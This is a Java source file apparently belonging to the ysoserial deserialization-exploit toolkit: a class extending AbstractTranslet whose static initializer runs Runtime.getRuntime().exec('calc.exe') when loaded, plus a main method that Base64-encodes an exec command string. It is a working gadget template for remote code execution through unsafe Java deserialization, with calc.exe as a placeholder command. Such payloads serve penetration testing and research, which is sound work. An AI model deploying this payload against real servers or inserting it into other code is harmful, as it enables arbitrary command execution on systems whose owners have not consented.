package ysoserial.payloads;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Scanner;
import javax.management.MBeanServer;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import org.apache.tomcat.util.buf.ByteChunk;

public class CustomJavaCode extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    public static void main(String[] args) {
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        String b64 = new String(Base64.getEncoder().encode(cmd.getBytes()));
        System.out.println(b64);
    }
}
